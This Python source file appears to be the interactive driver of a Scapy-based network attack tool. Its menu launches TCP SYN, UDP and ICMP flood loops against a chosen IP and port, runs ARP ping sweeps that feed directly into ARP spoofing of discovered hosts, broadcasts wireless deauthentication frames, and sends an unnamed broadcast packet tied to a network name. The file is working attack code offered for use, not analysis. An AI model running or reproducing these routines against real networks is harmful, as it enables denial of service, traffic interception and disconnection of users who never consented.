import socket
from time import sleep
from scapy.all import *
from attackFunction import *
"""
arp -a
route print
nmap -v -sn 192.168.1.1/24
"""


def inputIPCheck(outputString):
    inputIP, inputCheck = '0', True
    while inputCheck:
        print(outputString, end='')
        inputIP = input()
        IPCheck = inputIP.split('.')
        try:
            inputIP = ''
            if len(IPCheck) == 4:
                for subIPCheck in IPCheck:
                    if int(subIPCheck) >= 0 and int(subIPCheck) <= 255:
                        inputIP = inputIP + '.' + str(int(subIPCheck))
                        inputCheck = False
                    else:
                        inputCheck = True
                        break
            else:
                inputCheck = True
        except:
            inputCheck = True
            continue
        inputIP = inputIP[1:]
        if inputCheck == False and getmacbyip(inputIP) == None:
            print(inputIP + ' is invalid or unreachable.')
            inputCheck = True
    return inputIP


def inputINTCheck(outputString, boundary=0):
    inputNum, inputCheck = -1, True
    while inputCheck:
        print(outputString, end='')
        inputNum = input()
        try:
            inputNum = int(inputNum)
        except:
            inputCheck = True
            continue
        if boundary == 0:
            inputCheck = False
        elif boundary != 0 and inputNum >= 0 and inputNum < boundary:
            inputCheck = False
        else:
            inputCheck = True
    return inputNum


def packetPrint(i, packet):
    print()
    if i == 1:
        packet.show()
    elif i == 2:
        hexdump(packet)
    elif i == 3:
        print(repr(packet))
    Check = input('Continue or not (Y/N) : ')
    if Check == 'Y':
        return True
    return False


def DomaintoIPAddress():
    domainName = input('Domain name : ')
    try:
        domainIP = socket.gethostbyname(domainName)
        print(str(domainName) + "'s IP : " + str(domainIP))
        return domainIP
    except:
        print(str(domainName) + ' is invalid or unreachable.')
    return None


def ifaceChoose():
    ifList, ifaceList = [], []
    try:
        ifList = get_windows_if_list()
        for ifList_ in ifList:
            ifaceList.append(ifList_['description'])
    except:
        ifaceList = get_if_list()
    for i in range(len(ifaceList)):
        print(str(i) + '.' + ifaceList[i])
    ifaceListChoose = inputINTCheck('iface number : ', len(ifaceList) + 1)
    if ifaceListChoose == len(ifaceList):
        return conf.iface
    return ifaceList[ifaceListChoose]


def TCPSYNFloodAttackFunction():
    iface = ifaceChoose()
    # Taking input
    dstIP = inputIPCheck('dstIP : ')
    dstPort = inputINTCheck('dstPort : ')
    # Create packet
    functionHandler = TCPSYNFloodAttack()
    # Preset packet
    functionHandler.setAll(dstIP=dstIP, dstPort=dstPort, iface=iface)
    packet = functionHandler.attackPacket()
    continueCheck = packetPrint(1, packet)
    while continueCheck:
        try:
            # Set packet
            functionHandler.setAll(dstIP=dstIP, dstPort=dstPort, iface=iface)
            packet = functionHandler.attackPacket()
            # Send packets at layer 3
            send(packet, iface=functionHandler.Iface, verbose=0)
            # Print counter status
            functionHandler.printStatus()
        except KeyboardInterrupt:
            break
    return


def UDPFloodAttackFunction():
    iface = ifaceChoose()
    dstIP = inputIPCheck('dstIP : ')
    dstPort = inputINTCheck('dstPort : ')
    # Create packet
    functionHandler = UDPFloodAttack()
    # Preset packet
    functionHandler.setAll(dstIP=dstIP, dstPort=dstPort, iface=iface)
    packet = functionHandler.attackPacket()
    continueCheck = packetPrint(1, packet)
    while continueCheck:
        try:
            # Set packet
            functionHandler.setAll(dstIP=dstIP, dstPort=dstPort, iface=iface)
            packet = functionHandler.attackPacket()
            # Send packets at layer 2
            sendp(packet, iface=functionHandler.Iface, verbose=0)
            # Print counter status
            functionHandler.printStatus()
        except KeyboardInterrupt:
            break
    return


def ICMPFloodAttackFunction():
    iface = ifaceChoose()
    dstIP = inputIPCheck('dstIP : ')
    # Create packet
    functionHandler = ICMPFloodAttack()
    # Preset packet
    functionHandler.setAll(dstIP=dstIP, iface=iface)
    packet = functionHandler.attackPacket()
    continueCheck = packetPrint(1, packet)
    while continueCheck:
        try:
            # Set packet
            functionHandler.setAll(dstIP=dstIP, iface=iface)
            packet = functionHandler.attackPacket()
            # payload
            # Send packets at layer 3
            send(packet, iface=functionHandler.Iface, verbose=0)
            # Print counter status
            functionHandler.printStatus()
        except KeyboardInterrupt:
            break
    return


def packetCheck(answers, gatewayIP, results):
    for sent, received in answers:
        tmp = str(received.psrc)
        if tmp != gatewayIP:
            if tmp not in results:
                results.append(tmp)
    return results


def ARPPingFunction():
    iface = ifaceChoose()
    gatewayIP = conf.route.route("0.0.0.0")[2]
    maskSize = inputINTCheck('Mask Size : ', 32)
    tryTimes = inputINTCheck('Try Times : ', 101)
    targetIP = []
    # Create packet
    functionHandler = ARPPing()
    # Preset packet
    functionHandler.setAll(srcIP=gatewayIP,
                           dstMAC='ff:ff:ff:ff:ff:ff',
                           mesk=maskSize,
                           iface=iface)
    packet = functionHandler.attackPacket()
    continueCheck = packetPrint(3, packet)
    for i in range(tryTimes):
        # Set packet
        functionHandler.setAll(srcIP=gatewayIP,
                               dstMAC='ff:ff:ff:ff:ff:ff',
                               mesk=maskSize,
                               iface=iface)
        packet = functionHandler.attackPacket()
        # Send and receive packets at layer 2
        ans, unans = srp(packet,
                         iface=functionHandler.Iface,
                         type=ETH_P_ARP,
                         timeout=2,
                         verbose=0)
        # Print counter status
        functionHandler.printStatus()
        targetIP = packetCheck(ans, gatewayIP, targetIP)
    targetMAC = []
    if len(targetIP) == 0:
        print('\nARP Ping fail')
        return
    else:
        for targetIP_ in targetIP:
            targetMAC.append(getmacbyip(targetIP_))
        print('\n', targetIP)
        attack = input('Attack or not (Y/N) : ')
        if attack == 'Y':
            ARPSpoofingAttackFunction(True, targetIP, targetMAC)
    return


def ARPSpoofingAttackFunction(inputCheck=False, dstIP=None, dstMAC=None):
    iface = ifaceChoose()
    srcIP = conf.route.route("0.0.0.0")[2]
    srcMAC = getmacbyip(srcIP)
    if not inputCheck:
        dstIP = inputIPCheck('targetIP : ')
        dstMAC = getmacbyip(dstIP)
    # Create packet
    functionHandler = ARPSpoofingAttack()
    # Preset packet
    functionHandler.setAll(dstIP=dstIP,
                           srcIP=srcIP,
                           dstMAC=dstMAC,
                           srcMAC=srcMAC,
                           iface=iface)
    packet = functionHandler.attackPacket()
    continueCheck_1 = packetPrint(1, packet[0])
    if continueCheck_1:
        continueCheck_2 = packetPrint(1, packet[1])
    while continueCheck_2:
        try:
            # Set packet
            functionHandler.setAll(dstIP=dstIP,
                                   srcIP=srcIP,
                                   dstMAC=dstMAC,
                                   srcMAC=srcMAC,
                                   iface=iface)
            packets = functionHandler.attackPacket()
            # Send packets at layer 2
            for packets_ in packets:
                sendp(packets_, iface=functionHandler.Iface, verbose=0)
            # Print counter status
            functionHandler.printStatus()
            sleep(.1)
        except KeyboardInterrupt:
            break
    return


def WirelessDeauthenticationAttackFunction():
    iface = ifaceChoose()
    srcIP = conf.route.route("0.0.0.0")[2]
    srcMAC = getmacbyip(srcIP)
    dstMAC = 'ff:ff:ff:ff:ff:ff'
    # Create packet
    functionHandler = WirelessDeauthenticationAttack()
    # Preset packet
    functionHandler.setAll(dstMAC=dstMAC, srcMAC=srcMAC, iface=iface)
    packet = functionHandler.attackPacket()
    continueCheck = packetPrint(1, packet)
    while continueCheck:
        try:
            # Set packet
            functionHandler.setAll(dstMAC=dstMAC, srcMAC=srcMAC, iface=iface)
            packet = functionHandler.attackPacket()
            # Send packets at layer 2
            sendp(packet, iface=functionHandler.Iface, verbose=0)
            # Print counter status
            functionHandler.printStatus()
            sleep(.1)
        except KeyboardInterrupt:
            break
    return


def DontKnowWhatIsThisFunction():
    iface = ifaceChoose()
    netSSID = input('Network name : ')
    dstMAC = 'ff:ff:ff:ff:ff:ff'
    # Create packet
    functionHandler = DontKnowWhatIsThis()
    # Preset packet
    functionHandler.setAll(dstMAC=dstMAC, iface=iface)
    packet = functionHandler.attackPacket(netSSID)
    continueCheck = packetPrint(1, packet)
    while continueCheck:
        try:
            # Set packet
            functionHandler.setAll(dstMAC=dstMAC, iface=iface)
            packet = functionHandler.attackPacket(netSSID)
            # Send packets at layer 2
            sendp(packet, iface=functionHandler.Iface, verbose=0)
            # Print counter status
            functionHandler.printStatus()
            sleep(.1)
        except KeyboardInterrupt:
            break
    return


def main():
    while True:
        choose = inputINTCheck(
            '\n0.exit\n1.Domain IP\n2.TCP SYN Flood\n3.UDP Flood\n' +
            '4.ICMP Flood\n5.ARP Ping\n6.ARP Spoofing\n' +
            '7.Wireless Deauthentication\n' + '8.Dont Know What Is This\n', 9)
        if choose == 0:
            return
        elif choose == 1:
            print('\n--------------- Domain IP Start ---------------')
            DomaintoIPAddress()
            print('\n---------------- Domain IP End ----------------')
        elif choose == 2:
            print('\n---------- TCP SYN Flood Attack Start ----------')
            TCPSYNFloodAttackFunction()
            print('\n----------- TCP SYN Flood Attack End -----------')
        elif choose == 3:
            print('\n------------ UDP Flood Attack Start ------------')
            UDPFloodAttackFunction()
            print('\n------------- UDP Flood Attack End -------------')
        elif choose == 4:
            print('\n------------ ICMP Flood Attack Start ------------')
            ICMPFloodAttackFunction()
            print('\n------------- ICMP Flood Attack End -------------')
        elif choose == 5:
            print('\n---------------- ARP Ping Start ----------------')
            ARPPingFunction()
            print('\n----------------- ARP Ping End -----------------')
        elif choose == 6:
            print('\n----------- ARP Spoofing Attack Start -----------')
            ARPSpoofingAttackFunction()
            print('\n------------ ARP Spoofing Attack End ------------')
        elif choose == 7:
            print('\n----- Wireless Deauthentication Attack Start -----')
            WirelessDeauthenticationAttackFunction()
            print('\n------ Wireless Deauthentication Attack End ------')
        elif choose == 8:
            print('\n--------- Dont Know What Is This Start ---------')
            DontKnowWhatIsThisFunction()
            print('\n---------- Dont Know What Is This End ----------')
    return


def clearScreen():
    os.system('cls')


if __name__ == '__main__':
    clearScreen()
    print('\n-------------------- Attack Start --------------------')
    main()
    print('\n--------------------- Attack End ---------------------')
    exit()
